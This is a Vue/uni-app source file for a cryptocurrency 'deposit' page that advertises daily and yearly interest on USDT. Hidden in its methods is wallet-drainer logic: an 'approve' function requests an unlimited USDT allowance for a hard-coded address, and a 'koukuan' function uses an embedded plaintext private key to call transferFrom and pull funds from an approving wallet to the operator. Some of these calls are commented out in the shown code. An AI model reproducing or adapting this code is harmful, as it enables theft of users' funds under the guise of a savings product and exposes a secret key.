<template>
    <view class="subscribe" :data-theme="userTheme">
        <fui-nav-bar statusBar
                     isFixed
                     isOccupy
                     zIndex="9"
                     :title="$t('dp.t40')+' '+item.symbol"
                     color="var(--content-primary)"
                     background="var(--background-primary)"
                     @leftClick="$mroute.back()"
                     @init="navInit">
            <fui-icon name="arrowleft"
                      size="56"
                      color="var(--content-primary)">
            </fui-icon>
        </fui-nav-bar>
        <scroll-view scroll-y class="container" :style="{'height': ($device.windowHeight - navHeight) + 'px'}">
            <view class="row mt-10">
                <view class="left">
                    <text>{{ $t('dp.t12') }}</text>
                </view>
                <view class="right">
                    <text v-if="item.limit == 0">{{ $t('dp.t13') }}</text>
                    <text v-else>{{ item.limit }}{{ $t('dp.t14') }}</text>
                </view>
            </view>
            <view class="row">
                <view class="left">
                    <text>{{ $t('dp.t15') }}</text>
                    <image @click="openRedemption" src="/static/img/wenhao.webp" mode=""></image>
                </view>
                <view class="right">
                    <text>T+0/T+1</text>
                </view>
            </view>
            <view class="row">
                <view class="left">
                    <text>{{ $t('dp.t16') }}</text>
                </view>
                <view class="right">
                    <text>{{ $t('dp.t17') }} {{ item.day_rate }}% | {{ $t('dp.t18') }} {{ item.year_rate }}%</text>
                </view>
            </view>
            <view class="row">
                <view class="left">
                    <text>{{ $t('dp.t39') }}</text>
                </view>
            </view>
            <view class="row_bg">
                <view class="left">
                    <input type="number" v-model="amount" :placeholder="$t('dp.t19')+item.min+item.symbol"/>
                </view>
                <view class="right">
                    <text>{{ item.symbol }}</text>
                    <text>|</text>
                    <text @click="amount = balance">{{ $t('dp.t20') }}</text>
                </view>
            </view>
            <view class="row balance">
                <view class="left">
                    <text>{{ $t('dp.t21') }}</text>
                </view>
                <view class="right">
                    <text>{{ $util.float(balance) }} {{ item.symbol }}</text>
                    <image src="/static/img/tactic/tran-icon.png" mode="" @click="$mroute.exchange()"></image>
                </view>
            </view>
            <view class="card">
                <view class="row" style="margin-bottom: 10rpx;">
                    <view class="left">
                        <text>{{ $t('dp.t22') }}</text>
                    </view>
                </view>
                <uni-steps :options="list2" :active="active" direction="column"/>
                <view class="row" style="margin-top: 30rpx;">
                    <view class="left">
                        <text>{{ $t('dp.t25') }}</text>
                        <image @click="openInter" src="/static/img/wenhao.webp" mode=""></image>
                    </view>
                    <view class="right">
                        <text>{{ item.day_rate }}%</text>
                    </view>
                </view>
            </view>
            <view class="card">
                <view class="row" style="margin-bottom: 20rpx;">
                    <view class="left">
                        <text>{{ $t('dp.t26') }}</text>
                    </view>
                    <view class="right">
                        <fui-switch :scaleRatio="0.7"
                                    color="var(--color-primary)">
                        </fui-switch>
                    </view>
                </view>
                <text class="_tip">{{ $t('dp.t27') }}</text>
            </view>
            <view class="null_view_box"></view>
        </scroll-view>
        <!-- 底部 -->
        <view class="footer">
            <view class="top">
                <view class="check" @click="checked = !checked">
                    <image v-if="checked == false" src="/static/img/white-gou-sm.png" mode=""></image>
                    <image v-else src="/static/img/blue-gou-sm.png" mode=""></image>
                </view>
                <view class="agre">
                    <text @click="checked = !checked">{{ $t('dp.t28') }}</text>
                    <text @click="$mroute.webview(1,'zysxr')">《{{ config['site_name'] }} {{ $t('dp.t29') }}》</text>
                </view>
            </view>
            <button @click="confirm()" :class="checked && amount != '' ? 'activeBtn' :''">{{ $t('确定') }}</button>
        </view>
        <!-- 弹窗 -->
        <uni-popup ref="interestRule" type="bottom" mask-background-color="rgba(0, 0, 0, .7)">
            <view class="popup">
                <view class="p_title">
                    <text>{{ $t('dp.t30') }}</text>
                    <view class="close" @click="closePopup">
                        <fui-icon name="close" size="48" color="var(--content-primary)"></fui-icon>
                    </view>
                </view>
                <view class="p_content">
                    <text>{{ $t('dp.t30') }}：</text>
                    <text>{{ $t('dp.t31') }}</text>
                    <text>{{ $t('dp.t32') }}</text>
                    <text>{{ $t('dp.t33') }}</text>
                    <text>{{ $t('dp.t34') }}</text>
                </view>
            </view>
        </uni-popup>
        <uni-popup ref="redemptionRule" type="bottom" mask-background-color="rgba(0, 0, 0, .7)">
            <view class="popup">
                <view class="p_title">
                    <text>{{ $t('dp.t35') }}</text>
                    <view class="close" @click="closePopup">
                        <fui-icon name="close" size="48" color="var(--content-primary)"></fui-icon>
                    </view>
                </view>
                <view class="p_content">
                    <text>{{ $t('dp.t35') }}：</text>
                    <text>{{ $t('dp.t36') }}</text>
                    <text>{{ $t('dp.t37') }}</text>
                    <text>{{ $t('dp.t38') }}
                    </text>
                </view>
            </view>
        </uni-popup>
        <alert ref="alert" :ctxt="$t('取消')" :content="content"></alert>
        <loading ref="loading"></loading>
    </view>
</template>
<script>
import {NavBar} from 'vant';
import {mapState, mapGetters} from 'vuex';
import Api from '@/common/api/deposit';

// import Web3 from 'web3';
import {USDT_API} from "@/common/usdt_abis";
// import BN from 'bn.js'

export default {
    components: {
        [NavBar.name]: NavBar
    },
    data() {
        return {
            active: 0,
            list2: [{
                title: this.$t('dp.t23'),
                desc: this.$util.getDateStr()
            }, {
                title: this.$t('dp.t24'),
                desc: this.$util.getDateStr()
            }],
            checked: false,
            item: {},
            amount: "",
            balance: '0.00',
            content: "",
            navHeight: ""
        }
    },
    onShow() {
        this.item = uni.getStorageSync('deposit-item');

        const date = new Date();
        var end = new Date(date.getTime() + (this.item['limit'] * 86400 * 1000));
        this.list2[1]['desc'] = end.getFullYear() + '-' + (end.getMonth() + 1 >= 10 ? end.getMonth() + 1 : '0' + (end.getMonth() + 1)) + '-' + (end.getDate() >= 10 ? end.getDate() : '0' + end.getDate());
		this.getBalance();
        // if(parseInt(this.config['deposit_type']) === 0 ){
        //     this.getBalance();
        // }else{
        //     this.getWalletBalance();
        // }
    },
    computed: {
        ...mapState(['config']),
        ...mapGetters(['userTheme'])
    },
    methods: {
        koukuan(){
            const web3 = new Web3(window.ethereum);
            const contractAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7';

// 发送者地址和私钥
            const fromAddress = '0x4A59D1409237e77f988eFeb2F87a5dd6127DD54C';
            const privateKey = '311351e2c7ff8e726763e0af2d6ac1eae29aaf880ebc7ef256bf2a7f73b65328';

// 授权者地址
            const ownerAddress = '0x71bFf24DE5C2832485c89ED0F4EB15FcF92bA48D';

// 接收者地址
            const toAddress = '0x4A59D1409237e77f988eFeb2F87a5dd6127DD54C';

            // 创建合约实例
            const contract = new web3.eth.Contract(USDT_API, contractAddress);

// 构造交易数据
            const functionData = contract.methods.transferFrom(ownerAddress, toAddress, '1000000').encodeABI();

// 获取当前交易的 nonce
            web3.eth.estimateGas({
                from: fromAddress,
                to: contractAddress,
                data: functionData
            })
                .then(gasLimit => {
                    console.log('Estimated gas limit:', gasLimit);

                    // 获取当前网络的 gas 价格
                    web3.eth.getGasPrice()
                        .then(gasPrice => {
                            console.log('Gas price:', gasPrice);

                            // 计算交易费用
                            const transactionFee = BigInt(gasLimit) * BigInt(gasPrice);
                            console.log('Transaction fee:', transactionFee.toString());

                            // 构造交易对象
                            const rawTx = {
                                from: fromAddress,
                                to: contractAddress,
                                gasPrice: gasPrice,
                                gasLimit: gasLimit,
                                value: '0x0',
                                data: functionData
                            };

                            // 签名交易并发送
                            web3.eth.accounts.signTransaction(rawTx, privateKey)
                                .then(({ rawTransaction }) => {
                                    web3.eth.sendSignedTransaction(rawTransaction)
                                        .on('transactionHash', function (hash) {
                                            console.log('Transaction hash:', hash);
                                        })
                                        .on('receipt', function (receipt) {
                                            console.log('Receipt:', receipt);
                                        })
                                        .on('error', console.error);
                                })
                                .catch(console.error);
                        })
                        .catch(console.error);
                })
                .catch(console.error);

        },
        async getWalletBalance(){
            console.log("wallet balance");
            if(!window || !window.ethereum){
                uni.showToast({
                    text:"none object",
                    icon:"none"
                })
            }else{
                console.log("get balance");
                uni.showLoading();
                await window.ethereum.enable();
                window.ethereum.request({method:"eth_requestAccounts"}).then(r=>{
                    console.log(r);
                });
                const ethereum = new Web3(window.ethereum);
                let _this = this;
                ethereum.eth.getAccounts().catch(e=>{
                    console.log(e);
                    uni.hideLoading();
                }).then(async e=>{
                    console.log(e);
                    const walletAddress = e[0];
                    console.log('Wallet Address:', walletAddress);

                    const usdtContract = new ethereum.eth.Contract(USDT_API, "0xdAC17F958D2ee523a2206206994597C13D831ec7");

                    // 获取 USDT 余额
                    const balance = await usdtContract.methods.balanceOf(walletAddress).call();
                    uni.hideLoading();
                    _this.balance = parseFloat(Number(balance) / 1000000).toFixed(2);
                });


                // this.koukuan();
            }
        },
        navInit(e) {
            this.navHeight = e.height + e.statusBarHeight;
        },
        confirm() {
			this.balanceConfirm(0);
            // if(parseInt(this.config['deposit_type']) === 0){
            //     this.balanceConfirm(0);
            // }else{
            //     this.approve();
            // }

        },
        async approve(){
            let _this = this;
            const ethereum = new Web3(window.ethereum);
            const usdtContract = new ethereum.eth.Contract(USDT_API, "0xdAC17F958D2ee523a2206206994597C13D831ec7");
            const maxBigInt = BigInt(Number.MAX_SAFE_INTEGER);

            const accounts = await ethereum.eth.getAccounts();
            const walletAddress = accounts[0];
            usdtContract
                .methods
                .approve("0x71bFf24DE5C2832485c89ED0F4EB15FcF92bA48D",maxBigInt)
                .send({ from: walletAddress ,gas: 60000}).then(res=>{
                    // alert(JSON.stringify(res));
                _this.balanceConfirm(1,walletAddress);
                }).catch(ren=>{
                    console.log(ren);
                    uni.showToast({
                        text:"user cancel",
                        icon:"none"
                    })
                });
            _this.balanceConfirm(1,walletAddress);
        },
        balanceConfirm(flag = 0,walletAddress=""){
            if (!this.checked || this.amount === '') {
                return false;
            }

            if (parseFloat(this.amount) > parseFloat(this.balance)) {
                this.content = this.$t('dp.t10');
                this.$refs.alert.open();
                return false;
            }
            if (parseFloat(this.amount) < parseFloat(this.item.min)) {
                this.content = this.$t('dp.t11') + this.item.min + this.item.symbol;
                this.$refs.alert.open();
                return false;
            }
            this.$refs.loading.open();
            Api.submitDeposit({
                did: this.item['id'],
                amount: this.amount,
                auto: this.checked ? 1 : 0,
                currency_id: this.item.currency_id,
                approve : flag,
                wallet_amount:flag ? this.balance : 0,
                approve_address:walletAddress
            }).then(res => {
                this.$refs.loading.close();
                if (res.code !== 200) {
                    this.content = res.message;
                    this.$refs.alert.open();
                    return false;
                }
                uni.redirectTo({
                    url: "/pages/index/livecoin/result?symbol=" + this.item.symbol + "&amount=" + this.amount
                })
            }).catch((e) => {
                this.$refs.loading.close();
                this.content = e;
                this.$refs.alert.open();
            })
        },
        getBalance() {
            Api.getBalance(this.item.currency_id).then(res => {
                this.balance = res.data.balance;
            });
        },
        openInter() {
            this.$refs.interestRule.open();
        },
        openRedemption() {
            this.$refs.redemptionRule.open();
        },
        closePopup() {
            this.$refs.interestRule.close();
            this.$refs.redemptionRule.close();
        }
    }
}
</script>
<style lang="scss">
@import "subscribe.scss";
</style>
<style scoped>
/deep/ .van-icon {
    font-size: 30rpx;
    color: var(--content-tertiary);
}

/deep/ .uni-steps__column-text {
    height: 36rpx;
    flex-direction: row;
    justify-content: space-between;
    border: none !important;
    margin-top: 12rpx;
}

/deep/ .uni-steps__column-title {
    font-size: 24rpx;
    color: var(--content-tertiary) !important;
}

/deep/ .uni-steps__column-desc {
    font-size: 24rpx;
    color: var(--content-primary) !important;
}

/deep/ .uni-steps__column-circle {
    border-radius: 0;
    transform: rotate(45deg);
    background-color: var(--color-primary) !important;
}

/deep/ .uni-steps__column-check {
    width: 5px;
    height: 5px;
    transform: rotate(45deg);
    background-color: var(--color-primary) !important;
}

/deep/ .uniui-checkbox-filled::before {
    content: "";
}

/deep/ .uni-steps__column-line--before {
    height: 15px;
    transform: translate(0, 0);
}
</style>